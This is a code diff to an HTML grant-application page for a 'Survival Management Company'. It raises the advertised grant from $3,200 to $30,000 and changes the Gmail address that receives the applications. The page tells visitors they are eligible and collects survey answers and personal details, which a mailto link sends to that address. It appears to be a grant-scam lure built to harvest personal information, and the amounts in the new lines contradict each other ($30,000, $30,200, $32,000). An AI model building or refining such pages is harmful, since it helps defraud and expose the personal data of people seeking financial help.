@@ -154,10 +154,10 @@
         <label for="q1">1. How did you hear about Survival Management Company?</label>
         <input type="text" id="q1" required>
 
-        <label for="q2">2. Why do you need the $3,200 Grant?</label>
+        <label for="q2">2. Why do you need the $30,000 Grant?</label>
         <textarea id="q2" required></textarea>
 
-        <label for="q3">3. How will the $3,200 help you achieve your goals?</label>
+        <label for="q3">3. How will the $30,000 help you achieve your goals?</label>
         <textarea id="q3" required></textarea>
 
         <label for="q4">4. What is your current occupation?</label>
@@ -176,7 +176,7 @@
 <!-- Popup for Personal Details -->
 <div id="popup" class="popup">
     <div class="popup-content">
-        <h2>You're eligible for our $3,200 Grant!</h2>
+        <h2>You're eligible for our $30,000 Grant!</h2>
         <p>Please complete your application by entering your personal details below.</p>
         
         <label for="name">Full Name:</label>
@@ -228,12 +228,12 @@
 
         // Construct the email body
         const emailBody = `
-            Application for $3,200 Grant:
+            Application for up to $30,000 Grant:
 
             Survey Answers:
             1. How did you hear about Survival Management Company?: ${q1}
-            2. Why do you need the $3,200 Grant?: ${q2}
-            3. How will the $3,200 help you achieve your goals?: ${q3}
+            2. Why do you need the $30,200 Grant?: ${q2}
+            3. How will the money help you achieve your goals?: ${q3}
             4. What is your current occupation?: ${q4}
             5. What city and state are you located in?: ${q5}
             6. How old are you?: ${q6}
@@ -246,7 +246,7 @@
         `;
 
         // Create a mailto link to open the email client with pre-filled details
-        const mailtoLink = `mailto:agentofsmc@gmail.com?subject=Application for $3,200 Grant&body=${encodeURIComponent(emailBody)}`;
+        const mailtoLink = `mailto:survivalmanagementcompany@gmail.com?subject=Application for up to $32,000 Grant&body=${encodeURIComponent(emailBody)}`;
 
         // Open the default email client with the pre-filled email
         window.location.href = mailtoLink;
